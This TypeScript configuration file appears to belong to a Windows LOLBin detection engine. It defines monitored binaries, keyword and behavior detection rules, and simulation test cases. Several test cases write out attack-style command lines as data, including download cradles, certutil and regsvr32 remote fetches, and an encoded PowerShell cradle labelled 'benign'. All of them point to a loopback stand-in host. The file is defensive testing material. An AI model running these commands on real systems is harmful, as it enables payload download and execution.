import { 
  MonitoredBinaryMeta, 
  ContextualBehaviorDefinition, 
  LolbinGlobalConfig,
  SafeSimulationScenario
} from './types.js';

export const MONITORED_BINARIES: MonitoredBinaryMeta[] = [
  {
    name: 'powershell.exe',
    displayName: 'Windows PowerShell',
    category: 'Script Host',
    description: 'Microsoft task automation framework and scripting language heavily targeted for in-memory execution and payload staging.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1059.001', 'T1105', 'T1564.003'],
    legitimateUse: 'Administrative task automation, configuration management, and system diagnosis by authorized IT personnel.',
    commonAbuse: 'Base64 obfuscated execution (-enc), web download cradles (DownloadString, IWR), hidden window execution, AMSI bypasses.',
    suspiciousKeywords: ['-enc', '-encodedcommand', 'downloadstring', 'invoke-webrequest', 'bypass', '-w hidden', 'bitstransfer'],
    benignExamples: [
      'powershell.exe -Command "Get-Date"',
      'powershell.exe -NoProfile -Command "Get-Process | Select-Object -First 5"',
      'powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1'
    ],
    riskWeight: 85,
    totalDetections: 0
  },
  {
    name: 'cmd.exe',
    displayName: 'Windows Command Prompt',
    category: 'Command Interpreter',
    description: 'Default interactive command shell in Windows, exploited by web shells, Office macros, and service exploits.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1059.003', 'T1082'],
    legitimateUse: 'Interactive developer console, system batch jobs, scheduled administrative maintenance.',
    commonAbuse: 'Spawned by anomalous parents (browsers, Office apps, web servers), command chaining (&, &&, |), hidden execution.',
    suspiciousKeywords: ['/c echo', 'curl', 'powershell', 'http://', 'certutil'],
    benignExamples: [
      'cmd.exe /c echo Hello World',
      'cmd.exe /c dir C:\\Users',
      'cmd.exe /k "C:\\Program Files\\Microsoft Visual Studio\\VC\\Auxiliary\\Build\\vcvars64.bat"'
    ],
    riskWeight: 75,
    totalDetections: 0
  },
  {
    name: 'rundll32.exe',
    displayName: 'Run a DLL as an App',
    category: 'System Utility',
    description: 'Standard Windows utility used to execute 32-bit and 64-bit dynamic link library exports.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1218.011'],
    legitimateUse: 'Executing standard Control Panel applets, printing dialogs, and shell extensions.',
    commonAbuse: 'Executing inline JavaScript or VBScript, loading unverified DLLs from temporary paths, proxying execution of trojan DLLs.',
    suspiciousKeywords: ['javascript:', 'vbscript:', 'url.dll', 'scrobj.dll', 'temp\\', '#1'],
    benignExamples: [
      'rundll32.exe shell32.dll,Control_RunDLL desk.cpl',
      'rundll32.exe printui.dll,PrintUIEntry /?'
    ],
    riskWeight: 80,
    totalDetections: 0
  },
  {
    name: 'regsvr32.exe',
    displayName: 'Microsoft Register Server',
    category: 'System Utility',
    description: 'Registers and unregisters OLE controls and in-process COM DLL components in Windows.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1218.010'],
    legitimateUse: 'Self-registering COM DLLs during software installation by Windows Installer.',
    commonAbuse: 'Squiblydoo attack: using /s /u /i flags pointing to remote HTTP/HTTPS scriptlet files (.sct) to bypass AppLocker.',
    suspiciousKeywords: ['/s /u /i', '/i:http', 'scrobj.dll', 'http://', 'https://'],
    benignExamples: [
      'regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll',
      'regsvr32.exe /u C:\\Program Files\\ExampleApp\\component.dll'
    ],
    riskWeight: 85,
    totalDetections: 0
  },
  {
    name: 'mshta.exe',
    displayName: 'Microsoft HTML Application Host',
    category: 'Script Host',
    description: 'Executes Microsoft HTML Applications (.hta) and supports inline scripting engines outside browser sandbox.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1218.005'],
    legitimateUse: 'Legacy enterprise internal utilities designed as .hta web applications.',
    commonAbuse: 'Executing malicious remote HTA files or inline javascript:/vbscript: payload strings directly from command line.',
    suspiciousKeywords: ['javascript:', 'vbscript:', 'http://', 'https://', 'about:<script>'],
    benignExamples: [
      'mshta.exe C:\\Program Files\\EnterpriseTools\\dashboard.hta'
    ],
    riskWeight: 90,
    totalDetections: 0
  },
  {
    name: 'certutil.exe',
    displayName: 'Certificate Utility',
    category: 'System Utility',
    description: 'Command-line tool to manage certificates, widely abused for downloading remote payloads and decoding Base64 files.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1105', 'T1140', 'T1218'],
    legitimateUse: 'Displaying certificate authority details, verifying certificate chains, computing cryptographic hashes.',
    commonAbuse: 'Using -urlcache -split -f to download binaries from remote C2 servers or -decode to unpack staged malware.',
    suspiciousKeywords: ['-urlcache', '-split', '-verifyctl', '-decode', '-decodehex', 'http://', 'https://'],
    benignExamples: [
      'certutil.exe -hashfile C:\\Windows\\System32\\notepad.exe SHA256',
      'certutil.exe -dump C:\\Certs\\ca.cer'
    ],
    riskWeight: 80,
    totalDetections: 0
  },
  {
    name: 'bitsadmin.exe',
    displayName: 'Background Intelligent Transfer Service Utility',
    category: 'System Utility',
    description: 'Manages asynchronous background file transfers using idle network bandwidth.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1197', 'T1105'],
    legitimateUse: 'Queuing asynchronous background file transfers for system updates.',
    commonAbuse: 'Creating background download jobs (/transfer) to covertly download malware payloads without alerting users.',
    suspiciousKeywords: ['/transfer', '/download', '/addfile', '/create', 'http://', 'https://'],
    benignExamples: [
      'bitsadmin.exe /list /allusers',
      'bitsadmin.exe /reset'
    ],
    riskWeight: 75,
    totalDetections: 0
  },
  {
    name: 'wmic.exe',
    displayName: 'WMI Commandline Utility',
    category: 'System Utility',
    description: 'Command-line interface for Windows Management Instrumentation queries and operations.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1047', 'T1490'],
    legitimateUse: 'Querying hardware, OS configuration, and BIOS serial numbers in enterprise scripts.',
    commonAbuse: 'Spawning stealthy processes (process call create), deleting shadow copies, remote command execution (/node:).',
    suspiciousKeywords: ['process call create', 'shadowcopy delete', '/node:', 'startup get', 'service where'],
    benignExamples: [
      'wmic.exe os get caption,version',
      'wmic.exe bios get serialnumber',
      'wmic.exe cpu get name'
    ],
    riskWeight: 70,
    totalDetections: 0
  },
  {
    name: 'cscript.exe',
    displayName: 'Console Windows Script Host',
    category: 'Script Host',
    description: 'Command-line host for Windows Scripting Component files (VBScript, JScript).',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1059.005'],
    legitimateUse: 'Running administrative maintenance scripts written in VBScript or JScript.',
    commonAbuse: 'Executing obfuscated .vbs or .js droppers from temporary locations or proxying execution to avoid PowerShell logging.',
    suspiciousKeywords: ['//e:vbscript', '//e:jscript', 'temp\\', '.vbs', '.js', '//b'],
    benignExamples: [
      'cscript.exe //nologo C:\\Windows\\System32\\slmgr.vbs /dli',
      'cscript.exe //nologo C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs -l'
    ],
    riskWeight: 65,
    totalDetections: 0
  },
  {
    name: 'wscript.exe',
    displayName: 'Windows Script Host (GUI)',
    category: 'Script Host',
    description: 'GUI-based host for running VBScript and JScript scripts.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1059.005'],
    legitimateUse: 'Running Windows scripts that display GUI messages.',
    commonAbuse: 'Delivered via malicious email attachments (.vbs / .wsf) to stage initial compromise droppers.',
    suspiciousKeywords: ['temp\\', 'appdata\\', '.vbs', '.wsf', '.js'],
    benignExamples: [
      'wscript.exe C:\\Enterprise\\LogonScript.vbs'
    ],
    riskWeight: 65,
    totalDetections: 0
  },
  {
    name: 'msiexec.exe',
    displayName: 'Windows Installer',
    category: 'Installer',
    description: 'Interprets packages and installs programs configured for Windows Installer.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1218.007'],
    legitimateUse: 'Installing, updating, or repairing signed MSI software packages.',
    commonAbuse: 'Downloading and executing malicious MSI packages silently from remote HTTP/HTTPS URLs (/q /i http://...).',
    suspiciousKeywords: ['/q /i http', '/quiet /i http', '/qn /i http', 'http://', 'https://', '/y', '/z'],
    benignExamples: [
      'msiexec.exe /i "C:\\Packages\\Software.msi" /quiet /norestart',
      'msiexec.exe /x {12345678-1234-1234-1234-123456789012}'
    ],
    riskWeight: 75,
    totalDetections: 0
  },
  {
    name: 'schtasks.exe',
    displayName: 'Task Scheduler Configuration Tool',
    category: 'Task Manager',
    description: 'Enables an administrator to create, delete, query, change, run, and end scheduled tasks on a local or remote computer.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1053.005'],
    legitimateUse: 'Scheduling automated administrative backups, log rotations, and health checks.',
    commonAbuse: 'Creating persistent scheduled tasks (/create) executing LOLBins or binaries from temporary paths.',
    suspiciousKeywords: ['/create', '/change', '/run', 'temp\\', 'powershell', 'cmd.exe'],
    benignExamples: [
      'schtasks.exe /query /fo TABLE',
      'schtasks.exe /query /tn "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"'
    ],
    riskWeight: 75,
    totalDetections: 0
  },
  {
    name: 'reg.exe',
    displayName: 'Registry Console Tool',
    category: 'System Utility',
    description: 'Modifies subkeys, entries, and values in the Windows Registry from the command line.',
    defaultEnabled: true,
    enabled: true,
    mitreTechniques: ['T1112', 'T1547.001'],
    legitimateUse: 'Querying and configuring system registry settings during scripted provisioning.',
    commonAbuse: 'Modifying Run / RunOnce autostart keys (/add ... \\Run), modifying Image File Execution Options (IFEO) to hijack debugger.',
    suspiciousKeywords: ['add', 'delete', '\\run', '\\runonce', 'image file execution options', '/f'],
    benignExamples: [
      'reg.exe query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName',
      'reg.exe query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer"'
    ],
    riskWeight: 70,
    totalDetections: 0
  }
];

export const CONTEXTUAL_BEHAVIORS: ContextualBehaviorDefinition[] = [
  {
    id: 'encoded_powershell',
    name: 'Encoded / Obfuscated PowerShell Execution',
    description: 'PowerShell invoked with Base64 encoding parameters (-enc, -EncodedCommand) to obscure script payload from inspection.',
    primaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1059.001',
      technique_name: 'Command and Scripting Interpreter: PowerShell',
      subtechnique_id: 'T1059.001',
      subtechnique_name: 'PowerShell'
    },
    secondaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1027',
      technique_name: 'Obfuscated Files or Information'
    },
    severity: 'HIGH',
    baseScore: 80,
    indicators: ['-enc', '-encodedcommand', '-e ', '-ec ', '-en ', '-encoded '],
    benignExclusions: ['-noprofile', 'get-date', 'get-service'],
    enabled: true
  },
  {
    id: 'suspicious_download',
    name: 'Suspicious Network Download Cradle',
    description: 'System utility or script host executing remote file download commands (DownloadString, certutil -urlcache, bitsadmin /transfer, msiexec remote).',
    primaryMitre: {
      tactic: 'Command and Control',
      technique_id: 'T1105',
      technique_name: 'Ingress Tool Transfer'
    },
    secondaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1218',
      technique_name: 'System Binary Proxy Execution'
    },
    severity: 'HIGH',
    baseScore: 85,
    indicators: [
      'downloadstring', 'downloadfile', 'invoke-webrequest', 'iwr ', 'start-bitstransfer',
      'net.webclient', '-urlcache', '/transfer', '/download', 'http://', 'https://'
    ],
    benignExclusions: ['-hashfile', '/list', 'get-process'],
    enabled: true
  },
  {
    id: 'hidden_execution',
    name: 'Hidden Window / Stealth Execution',
    description: 'Process launched with flags explicitly concealing user interface windows (-WindowStyle Hidden, -w hidden, vbhide, /b) to evade interactive detection.',
    primaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1564.003',
      technique_name: 'Hide Artifacts: Hidden Window',
      subtechnique_id: 'T1564.003',
      subtechnique_name: 'Hidden Window'
    },
    severity: 'HIGH',
    baseScore: 75,
    indicators: ['-windowstyle hidden', '-w hidden', '-win hidden', '-w 1', '-win 1', 'vbhide', 'start /b'],
    benignExclusions: ['-windowstyle normal', '-windowstyle maximized'],
    enabled: true
  },
  {
    id: 'unusual_parent',
    name: 'Unusual Parent Process Spawning Command Shell',
    description: 'Command or script interpreter spawned by anomalous system background services (svchost.exe, spoolsv.exe, sqlservr.exe, w3wp.exe) indicative of exploit or web shell.',
    primaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1059.003',
      technique_name: 'Command and Scripting Interpreter: Windows Command Shell',
      subtechnique_id: 'T1059.003',
      subtechnique_name: 'Windows Command Shell'
    },
    severity: 'HIGH',
    baseScore: 75,
    indicators: ['svchost.exe', 'spoolsv.exe', 'sqlservr.exe', 'w3wp.exe', 'httpd.exe', 'nginx.exe', 'services.exe'],
    benignExclusions: ['explorer.exe', 'cmd.exe', 'powershell.exe', 'devenv.exe', 'code.exe', 'windowsterminal.exe'],
    enabled: true
  },
  {
    id: 'office_to_powershell',
    name: 'Office Application Spawning PowerShell',
    description: 'Microsoft Office suite binary (Word, Excel, PowerPoint, Outlook) spawning PowerShell, the hallmark indicator of malicious macro or CVE weaponization.',
    primaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1059.001',
      technique_name: 'Command and Scripting Interpreter: PowerShell',
      subtechnique_id: 'T1059.001',
      subtechnique_name: 'PowerShell'
    },
    secondaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1204.002',
      technique_name: 'User Execution: Malicious File',
      subtechnique_id: 'T1204.002',
      subtechnique_name: 'Malicious File'
    },
    severity: 'CRITICAL',
    baseScore: 90,
    indicators: ['winword.exe', 'excel.exe', 'powerpnt.exe', 'outlook.exe', 'msaccess.exe', 'visio.exe', 'mspub.exe'],
    benignExclusions: [],
    enabled: true
  },
  {
    id: 'browser_to_powershell',
    name: 'Web Browser Spawning Shell or Script Interpreter',
    description: 'Web browser process (Chrome, Edge, Firefox) directly spawning PowerShell or cmd.exe, indicating remote code execution, malicious extension, or drive-by download.',
    primaryMitre: {
      tactic: 'Initial Access',
      technique_id: 'T1189',
      technique_name: 'Drive-by Compromise'
    },
    secondaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1059.001',
      technique_name: 'Command and Scripting Interpreter: PowerShell',
      subtechnique_id: 'T1059.001'
    },
    severity: 'HIGH',
    baseScore: 85,
    indicators: ['chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe', 'opera.exe', 'iexplore.exe'],
    benignExclusions: [],
    enabled: true
  },
  {
    id: 'powershell_to_lolbin',
    name: 'PowerShell Spawning Secondary LOLBin',
    description: 'PowerShell spawning secondary living-off-the-land binaries (certutil, bitsadmin, mshta, regsvr32, rundll32, wmic) in an execution chain.',
    primaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1218',
      technique_name: 'System Binary Proxy Execution'
    },
    secondaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1059.001',
      technique_name: 'Command and Scripting Interpreter: PowerShell'
    },
    severity: 'HIGH',
    baseScore: 80,
    indicators: ['powershell.exe', 'pwsh.exe'],
    benignExclusions: [],
    enabled: true
  },
  {
    id: 'lolbin_to_executable',
    name: 'LOLBin Spawning Binary Executable Payload',
    description: 'Living-off-the-Land binary (certutil, bitsadmin, mshta, rundll32, wmic, regsvr32) spawning an executable payload (.exe) rather than performing native system tasks.',
    primaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1218',
      technique_name: 'System Binary Proxy Execution'
    },
    secondaryMitre: {
      tactic: 'Execution',
      technique_id: 'T1204.002',
      technique_name: 'User Execution: Malicious File'
    },
    severity: 'HIGH',
    baseScore: 80,
    indicators: ['.exe', '.scr', '.com', '.bat', '.cmd'],
    benignExclusions: ['conhost.exe'],
    enabled: true
  },
  {
    id: 'temp_location_execution',
    name: 'LOLBin Executing from or Targeting Temporary Location',
    description: 'LOLBin executed from or targeting binaries hosted in world-writable temporary staging locations (AppData\\Local\\Temp, Windows\\Temp, Users\\Public).',
    primaryMitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1027',
      technique_name: 'Obfuscated Files or Information'
    },
    severity: 'MEDIUM',
    baseScore: 65,
    indicators: ['\\appdata\\local\\temp\\', '\\windows\\temp\\', '\\users\\public\\', '\\temp\\', '\\programdata\\'],
    benignExclusions: [],
    enabled: true
  }
];

export const DEFAULT_LOLBIN_CONFIG: LolbinGlobalConfig = {
  contextualDetectionEnabled: true,
  suppressBenignAdministrativeCommands: true,
  strictLineageVerification: true,
  monitoredTempDirectories: [
    '\\appdata\\local\\temp\\',
    '\\windows\\temp\\',
    '\\users\\public\\',
    '\\temp\\',
    '\\programdata\\'
  ],
  monitoredOfficeParents: [
    'winword.exe',
    'excel.exe',
    'powerpnt.exe',
    'outlook.exe',
    'msaccess.exe',
    'visio.exe',
    'mspub.exe'
  ],
  monitoredBrowserParents: [
    'chrome.exe',
    'msedge.exe',
    'firefox.exe',
    'brave.exe',
    'opera.exe',
    'iexplore.exe'
  ],
  anomalousSystemServices: [
    'svchost.exe',
    'spoolsv.exe',
    'sqlservr.exe',
    'w3wp.exe',
    'httpd.exe',
    'nginx.exe',
    'tomcat.exe',
    'services.exe'
  ],
  minimumDetectionScore: 50,
  lastUpdated: new Date().toISOString()
};

export const SAFE_SIMULATIONS: SafeSimulationScenario[] = [
  // Benign cases (MUST NOT ALERT)
  {
    id: 'SIM-BENIGN-CMD-ECHO',
    name: 'Benign: cmd.exe /c echo Hello World',
    category: 'benign_safe',
    targetBinary: 'cmd.exe',
    expectedAlert: false,
    description: 'Standard benign command line invocation with echo from explorer.',
    commandLine: 'cmd.exe /c echo LocalEDR Benign Verification Test',
    parentProcess: 'explorer.exe',
    imagePath: 'C:\\Windows\\System32\\cmd.exe',
    explanation: 'Legitimate administrative query with normal parent (explorer.exe). No alert is generated.'
  },
  {
    id: 'SIM-BENIGN-PS-DATE',
    name: 'Benign: powershell.exe Get-Date',
    category: 'benign_safe',
    targetBinary: 'powershell.exe',
    expectedAlert: false,
    description: 'Standard benign PowerShell cmdlet executed by developer/admin.',
    commandLine: 'powershell.exe -NoProfile -Command "Get-Date"',
    parentProcess: 'explorer.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Standard script cmdlet without obfuscation, downloads, or abnormal parent.'
  },
  {
    id: 'SIM-BENIGN-CERTUTIL-HASH',
    name: 'Benign: certutil.exe -hashfile',
    category: 'benign_safe',
    targetBinary: 'certutil.exe',
    expectedAlert: false,
    description: 'Legitimate SHA-256 file hashing operation via certutil.',
    commandLine: 'certutil.exe -hashfile C:\\Windows\\System32\\notepad.exe SHA256',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\certutil.exe',
    explanation: 'Cryptographic hash calculation is standard legitimate use of certutil. Not an ingress download.'
  },
  {
    id: 'SIM-BENIGN-BITSADMIN-LIST',
    name: 'Benign: bitsadmin.exe /list',
    category: 'benign_safe',
    targetBinary: 'bitsadmin.exe',
    expectedAlert: false,
    description: 'Legitimate query of background intelligent transfer jobs.',
    commandLine: 'bitsadmin.exe /list /allusers',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\bitsadmin.exe',
    explanation: 'Read-only administrative query. No download or transfer initiated.'
  },
  {
    id: 'SIM-BENIGN-SCHTASKS-QUERY',
    name: 'Benign: schtasks.exe /query',
    category: 'benign_safe',
    targetBinary: 'schtasks.exe',
    expectedAlert: false,
    description: 'Read-only task listing using standard schtasks query parameters.',
    commandLine: 'schtasks.exe /query /fo TABLE',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\schtasks.exe',
    explanation: 'Safe inventory query. No task creation or execution.'
  },
  {
    id: 'SIM-BENIGN-REG-QUERY',
    name: 'Benign: reg.exe query HKLM\\Software',
    category: 'benign_safe',
    targetBinary: 'reg.exe',
    expectedAlert: false,
    description: 'Read-only registry key lookup without modification.',
    commandLine: 'reg.exe query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\reg.exe',
    explanation: 'Read-only registry query. Run/RunOnce autostart keys are not modified.'
  },
  {
    id: 'SIM-BENIGN-WMIC-OS',
    name: 'Benign: wmic.exe os get caption',
    category: 'benign_safe',
    targetBinary: 'wmic.exe',
    expectedAlert: false,
    description: 'Safe WMI operating system metadata query.',
    commandLine: 'wmic.exe os get caption,version',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\wbem\\wmic.exe',
    explanation: 'Read-only operating system query. No process creation or shadow copy tampering.'
  },

  // Contextual Detection cases (SHOULD ALERT)
  {
    id: 'SIM-ALERT-ENCODED-PS',
    name: 'Alert: Encoded PowerShell Script Execution',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'encoded_powershell',
    mitre: 'T1059.001',
    description: 'PowerShell executing with -EncodedCommand containing benign test string.',
    commandLine: 'powershell.exe -NoProfile -NonInteractive -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB0AGUAcwB0AC4AcABzADEAJwApAA==',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Matches -enc encoded PowerShell execution pattern designed to obscure script arguments.'
  },
  {
    id: 'SIM-ALERT-PS-DOWNLOAD-CRADLE',
    name: 'Alert: PowerShell Download Cradle',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'suspicious_download',
    mitre: 'T1105',
    description: 'PowerShell invoking Net.WebClient DownloadString cradle.',
    commandLine: 'powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadString(\'http://127.0.0.1:8080/safe_sample.ps1\')"',
    parentProcess: 'explorer.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Matches remote download cradle pattern (Net.WebClient DownloadString) commonly used for staging payloads.'
  },
  {
    id: 'SIM-ALERT-PS-HIDDEN-WINDOW',
    name: 'Alert: PowerShell Hidden Window Execution',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'hidden_execution',
    mitre: 'T1564.003',
    description: 'PowerShell launched with -WindowStyle Hidden flag.',
    commandLine: 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Write-Host SafeHiddenExecution"',
    parentProcess: 'explorer.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Matches hidden window attribute (-WindowStyle Hidden) used to conceal execution from desktop users.'
  },
  {
    id: 'SIM-ALERT-OFFICE-POWERSHELL',
    name: 'Alert: Office (Word) Spawning PowerShell',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'office_to_powershell',
    mitre: 'T1059.001',
    description: 'winword.exe spawning powershell.exe indicative of macro execution.',
    commandLine: 'powershell.exe -ExecutionPolicy Bypass -Command "echo OfficeMacroTest"',
    parentProcess: 'winword.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Anomalous parent-child relationship: Microsoft Word should never spawn PowerShell.'
  },
  {
    id: 'SIM-ALERT-BROWSER-POWERSHELL',
    name: 'Alert: Web Browser (Chrome) Spawning PowerShell',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'browser_to_powershell',
    mitre: 'T1189',
    description: 'chrome.exe spawning powershell.exe indicative of drive-by compromise or browser exploit.',
    commandLine: 'powershell.exe -Command "echo BrowserExploitSimulation"',
    parentProcess: 'chrome.exe',
    imagePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    explanation: 'Browser processes are prohibited from launching system shells directly.'
  },
  {
    id: 'SIM-ALERT-PS-TO-LOLBIN',
    name: 'Alert: PowerShell Spawning Secondary LOLBin (certutil)',
    category: 'contextual_detection',
    targetBinary: 'certutil.exe',
    expectedAlert: true,
    behavior: 'powershell_to_lolbin',
    mitre: 'T1218',
    description: 'powershell.exe spawning certutil.exe with URL cache download arguments.',
    commandLine: 'certutil.exe -urlcache -split -f http://127.0.0.1/test_payload.bin payload.exe',
    parentProcess: 'powershell.exe',
    imagePath: 'C:\\Windows\\System32\\certutil.exe',
    explanation: 'Chained LOLBin execution: PowerShell delegating download to CertUtil.'
  },
  {
    id: 'SIM-ALERT-LOLBIN-TO-EXE',
    name: 'Alert: LOLBin (rundll32) Spawning Executable',
    category: 'contextual_detection',
    targetBinary: 'rundll32.exe',
    expectedAlert: true,
    behavior: 'lolbin_to_executable',
    mitre: 'T1218',
    description: 'rundll32.exe proxying execution of dropped executable payload.',
    commandLine: 'C:\\Users\\Public\\stage_agent.exe --worker',
    parentProcess: 'rundll32.exe',
    imagePath: 'C:\\Users\\Public\\stage_agent.exe',
    explanation: 'LOLBin abused to spawn executable payload rather than running system components.'
  },
  {
    id: 'SIM-ALERT-TEMP-LOCATION-EXEC',
    name: 'Alert: PowerShell Staged in Temp Directory',
    category: 'contextual_detection',
    targetBinary: 'powershell.exe',
    expectedAlert: true,
    behavior: 'temp_location_execution',
    mitre: 'T1027',
    description: 'Target binary executed from world-writable AppData\\Local\\Temp folder.',
    commandLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\AppData\\Local\\Temp\\update_stager.ps1',
    parentProcess: 'explorer.exe',
    imagePath: 'C:\\Users\\User\\AppData\\Local\\Temp\\update_stager.exe',
    explanation: 'Execution hosted within temporary directory commonly used by droppers.'
  },
  {
    id: 'SIM-ALERT-UNUSUAL-PARENT-CMD',
    name: 'Alert: Windows Service (svchost) Spawning cmd.exe',
    category: 'contextual_detection',
    targetBinary: 'cmd.exe',
    expectedAlert: true,
    behavior: 'unusual_parent',
    mitre: 'T1059.003',
    description: 'System service host spawning interactive command prompt.',
    commandLine: 'cmd.exe /c whoami',
    parentProcess: 'svchost.exe',
    imagePath: 'C:\\Windows\\System32\\cmd.exe',
    explanation: 'svchost.exe should never spawn interactive command shells without legitimate service host context.'
  },
  {
    id: 'SIM-ALERT-REGSVR32-SQUIBLYDOO',
    name: 'Alert: Regsvr32 Squiblydoo Remote Scriptlet',
    category: 'contextual_detection',
    targetBinary: 'regsvr32.exe',
    expectedAlert: true,
    behavior: 'suspicious_download',
    mitre: 'T1218.010',
    description: 'regsvr32.exe invoked with /s /u /i pointing to remote scriptlet.',
    commandLine: 'regsvr32.exe /s /u /i:http://127.0.0.1/safe.sct scrobj.dll',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\regsvr32.exe',
    explanation: 'Squiblydoo proxy execution technique used to execute remote XML/SCT scripts.'
  },
  {
    id: 'SIM-ALERT-MSHTA-INLINE-SCRIPT',
    name: 'Alert: Mshta Remote / Inline Script Execution',
    category: 'contextual_detection',
    targetBinary: 'mshta.exe',
    expectedAlert: true,
    behavior: 'suspicious_download',
    mitre: 'T1218.005',
    description: 'mshta.exe executing remote URL payload directly from command line.',
    commandLine: 'mshta.exe http://127.0.0.1:8080/sample.hta',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\mshta.exe',
    explanation: 'Mshta executing remote HTA payload outside browser sandbox.'
  },
  {
    id: 'SIM-ALERT-MSIEXEC-REMOTE-MSI',
    name: 'Alert: Msiexec Silent Remote Package Download',
    category: 'contextual_detection',
    targetBinary: 'msiexec.exe',
    expectedAlert: true,
    behavior: 'suspicious_download',
    mitre: 'T1218.007',
    description: 'msiexec.exe downloading and installing remote MSI package silently.',
    commandLine: 'msiexec.exe /q /i http://127.0.0.1/setup.msi',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\msiexec.exe',
    explanation: 'Msiexec silent installation pointing to external HTTP URL.'
  },
  {
    id: 'SIM-ALERT-WMIC-PROCESS-CREATE',
    name: 'Alert: WMIC Process Call Create',
    category: 'contextual_detection',
    targetBinary: 'wmic.exe',
    expectedAlert: true,
    behavior: 'powershell_to_lolbin',
    mitre: 'T1047',
    description: 'wmic.exe invoking process call create for stealthy execution.',
    commandLine: 'wmic.exe process call create "calc.exe"',
    parentProcess: 'cmd.exe',
    imagePath: 'C:\\Windows\\System32\\wbem\\wmic.exe',
    explanation: 'WMIC abused to spawn stealthy processes bypassing direct parent-child tracking.'
  }
];
